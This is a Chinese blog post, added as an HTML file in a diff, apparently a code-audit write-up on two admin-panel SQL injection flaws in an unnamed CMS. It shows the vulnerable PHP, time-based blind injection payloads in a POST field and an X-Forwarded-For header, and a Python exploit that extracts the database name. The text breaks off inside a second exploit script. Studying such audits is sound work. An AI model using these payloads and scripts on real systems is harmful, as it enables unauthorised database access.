@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xianyu123's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="本文首发于先知社区——对某cms的一次审计，转载时请标明出处">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对某cms的一次审计">
+<meta property="og:url" content="http://0clickjacking0.github.io/2020/06/18/对某cms的一次审计/index.html">
+<meta property="og:site_name" content="xianyu123&#39;s Blog">
+<meta property="og:description" content="本文首发于先知社区——对某cms的一次审计，转载时请标明出处">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://images.xianyu123.club/20200408135511.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200408135556.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200408135648.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200408135739.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200408141210.jpeg">
+<meta property="og:image" content="http://images.xianyu123.club/20200408141355.png">
+<meta property="og:image" content="http://images.xianyu123.club/20200408141657.jpeg">
+<meta property="og:image" content="http://images.xianyu123.club/20200408141925.jpeg">
+<meta property="og:updated_time" content="2020-06-18T03:07:48.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="对某cms的一次审计">
+<meta name="twitter:description" content="本文首发于先知社区——对某cms的一次审计，转载时请标明出处">
+<meta name="twitter:image" content="http://images.xianyu123.club/20200408135511.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '3WG8LC0SCP',
+      apiKey: 'fd95735b1b343c09b1c7aada663dfa7a',
+      indexName: 'dev_xianyu123',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字搜索","hits_empty":"没有找到与 ${query} 相关的内容","hits_stats":"搜索到 ${hits} 条相关记录，共耗时 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0clickjacking0.github.io/2020/06/18/对某cms的一次审计/">
+
+
+
+
+
+
+  <title>对某cms的一次审计 | xianyu123's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xianyu123's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0clickjacking0.github.io/2020/06/18/对某cms的一次审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xianyu123">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xianyu123's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">对某cms的一次审计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-18T11:01:59+08:00">
+                2020-06-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/06/18/对某cms的一次审计/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/06/18/对某cms的一次审计/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/06/18/对某cms的一次审计/" class="leancloud_visitors" data-flag-title="对某cms的一次审计">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文首发于先知社区——<a href="https://xz.aliyun.com/t/7557" target="_blank" rel="noopener">对某cms的一次审计</a>，转载时请标明出处</p>
+<a id="more"></a>
+<p>记一次某cms的审计，文章有写的不好的地方，大佬们轻喷。</p>
+<h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── Conf（连接数据库的一些配置文件）</span><br><span class="line">├── Libs（一些公共函数）</span><br><span class="line">├── Statics（js的一些静态文件）</span><br><span class="line">├── Style（css样式）</span><br><span class="line">├── add_book.php</span><br><span class="line">├── add_do.php</span><br><span class="line">├── code.php</span><br><span class="line">├── foot.php</span><br><span class="line">├── index.php</span><br><span class="line">├── install（网站安装目录）</span><br><span class="line">├── system（网站后台，审计的重点）</span><br><span class="line">└── top.php</span><br></pre></td></tr></table></figure>
+<h1 id="后台SQL注入漏洞"><a href="#后台SQL注入漏洞" class="headerlink" title="后台SQL注入漏洞"></a>后台SQL注入漏洞</h1><h2 id="第一处sql注入"><a href="#第一处sql注入" class="headerlink" title="第一处sql注入"></a>第一处sql注入</h2><p><code>/system/add_book_class.php</code>，关键代码如下，这里没有任何的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"act"</span>]==ok)&#123;</span><br><span class="line">	$siteinfo = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'title'</span> =&gt; $_POST[<span class="string">'title'</span>],</span><br><span class="line">		<span class="string">'c_order'</span> =&gt; $_POST[<span class="string">'c_order'</span>]</span><br><span class="line">		);</span><br><span class="line">	$db-&gt;insert(<span class="string">"****cms_book_class"</span>, $siteinfo);</span><br><span class="line">	<span class="comment">//$db-&gt;close();</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script language='javascript'&gt;"</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"alert('恭喜您,信息内容添加成功!');"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">" location='manage_book_class.php';"</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>insert函数在<code>/Libs/Class/mysql.class.php</code>，内容如下，这里也并没有对插入数据库的函数进行过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($tableName, $column = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">         $columnName = <span class="string">""</span>;</span><br><span class="line">         $columnValue = <span class="string">""</span>;</span><br><span class="line">         <span class="keyword">foreach</span> ($column <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">             $columnName .= $key . <span class="string">","</span>;</span><br><span class="line">             $columnValue .= <span class="string">"'"</span> . $value . <span class="string">"',"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         $columnName = substr($columnName, <span class="number">0</span>, strlen($columnName) - <span class="number">1</span>);</span><br><span class="line">         $columnValue = substr($columnValue, <span class="number">0</span>, strlen($columnValue) - <span class="number">1</span>);</span><br><span class="line">         $sql = <span class="string">"INSERT INTO $tableName($columnName) VALUES($columnValue)"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/add_book_class.php?act=ok</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:81</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 93</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:81</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:81/system/add_book_class.php</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=npvaign44srcvlhjglh9srrqo6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">title=',case when (ascii(mid((database()),1,1))&lt;127) then (sleep(5)) else (1) end)#&amp;c_order=1</span><br></pre></td></tr></table></figure>
+<p>这里<code>title</code>和<code>c_order</code>参数都存在sql注入</p>
+<p>获取数据库名的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://localhost:81/system/add_book_class.php?act=ok'</span></span><br><span class="line"><span class="comment"># 这里省去了登录的爬虫，因为存在验证码，ocr比较麻烦，所以登录成功后，把cookie替换一下即可</span></span><br><span class="line">cookie = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=npvaign44srcvlhjglh9srrqo6'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search_sql</span><span class="params">(start,end,payload,length=<span class="number">2</span>)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = start</span><br><span class="line">        right = end</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            full_payload = payload.format(num1=str(i),num2=str(mid))</span><br><span class="line">            requests.post(url=url,data=&#123;<span class="string">'title'</span>:full_payload,<span class="string">'c_order'</span>:<span class="string">'1'</span>&#125;,headers=cookie)</span><br><span class="line">            print(full_payload)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名长度</span></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">database_length_payload = <span class="string">"',case when (ascii(mid((length(database())),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end)#"</span></span><br><span class="line">database_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,database_length_payload,<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'database_length:'</span>+database_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">database_payload = <span class="string">"',case when (ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end)#"</span></span><br><span class="line">print(<span class="string">'database_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,database_payload,int(database_length)))</span><br></pre></td></tr></table></figure>
+<h2 id="第二处sql注入"><a href="#第二处sql注入" class="headerlink" title="第二处sql注入"></a>第二处sql注入</h2><p><code>/system/loginpass.php</code>关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">$login_ip=getIp();</span><br><span class="line">  $sql=<span class="string">"select * from admin_user where u_name='"</span>.$m_name.<span class="string">"' and u_pwd='"</span>.$m_pwd.<span class="string">"'"</span>;</span><br><span class="line">  $result=$db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>(!mysql_num_rows($result)==<span class="number">0</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">"m_name"</span>] = $m_name;</span><br><span class="line">	$db-&gt;query(<span class="string">"UPDATE admin_user SET login_nums=login_nums+1 where u_name='"</span>.$m_name.<span class="string">"'"</span>);</span><br><span class="line">	$login_info=<span class="keyword">array</span>(</span><br><span class="line">	   <span class="string">'u_name'</span>=&gt;$m_name,</span><br><span class="line">	   <span class="string">'login_date'</span>=&gt;strtotime(date(<span class="string">'Y-m-d'</span>)),</span><br><span class="line">	   <span class="string">'login_ip'</span>=&gt;$login_ip</span><br><span class="line">	);</span><br><span class="line">	$db-&gt;insert(<span class="string">"admin_login_log"</span>,$login_info);</span><br><span class="line">	$db-&gt;close();</span><br><span class="line">	ok_info(<span class="string">'***cms.php'</span>,<span class="string">'恭喜您，登陆成功!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p><code>getIp()</code>函数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">        $ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">            $ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">                $ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>))</span><br><span class="line">                    $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    $ip = <span class="string">"unknown"</span>;</span><br><span class="line">    <span class="keyword">return</span> ($ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里对ip没有做任何的过滤限制，我们可以用http头<code>X-Forwarded-For</code>，对输入的ip进行控制，也就是说，<code>loginpass.php</code>中的变量<code>$login_ip</code>是可控的</p>
+<p><code>insert</code>函数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($tableName, $column = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">         $columnName = <span class="string">""</span>;</span><br><span class="line">         $columnValue = <span class="string">""</span>;</span><br><span class="line">         <span class="keyword">foreach</span> ($column <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">             $columnName .= $key . <span class="string">","</span>;</span><br><span class="line">             $columnValue .= <span class="string">"'"</span> . $value . <span class="string">"',"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         $columnName = substr($columnName, <span class="number">0</span>, strlen($columnName) - <span class="number">1</span>);</span><br><span class="line">         $columnValue = substr($columnValue, <span class="number">0</span>, strlen($columnValue) - <span class="number">1</span>);</span><br><span class="line">         $sql = <span class="string">"INSERT INTO $tableName($columnName) VALUES($columnValue)"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>这里对插入的数据也没有做任何限制</p>
+<p>payload如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/loginpass.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:81</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 33</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:81</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:81/system/index.php</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=npvaign44srcvlhjglh9srrqo6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 1' and case when (ascii(mid((database()),1,1))&lt;127) then (sleep(5)) else (1) end and '</span><br><span class="line"></span><br><span class="line">admin=1&amp;password=1&amp;checkcode=4K23</span><br></pre></td></tr></table></figure>
+<p>也就是说，我们只要能正确识别验证码，<code>X-Forwarded-For</code>中提交盲注的内容，就可以进行sql注入</p>
+<p>注入数据库名的<code>exp.py</code></p>
+<p>这里必须要安装<code>pytesseract库</code>和<code>tesseract</code>，这样的话ocr识别很快</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 